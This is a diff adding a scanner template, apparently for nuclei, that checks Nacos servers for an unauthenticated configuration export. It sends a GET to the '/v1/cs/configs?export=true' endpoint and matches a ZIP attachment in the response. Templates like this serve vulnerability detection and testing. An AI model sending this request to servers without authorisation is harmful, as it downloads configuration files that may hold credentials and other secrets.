@@ -1,0 +1,27 @@
+id: poc-yaml-nacos-configs-export
+info:
+  name: Nacos Unauthorized Config Export Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak,nacos
+http:
+  - method: GET
+    path:
+      - "/v1/cs/configs?export=true&group&tenant&appName&ids&dataId"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: binary
+        binary:
+          - "504B0304" # PKZIP file signature
+        part: body
+      - type: word
+        words:
+          - "attachment;filename=nacos_config_export_"
+        part: header
+      - type: regex
+        regex:
+          - "^(?!.*</).*" # Ensure body does not contain XML-like content
+        part: body
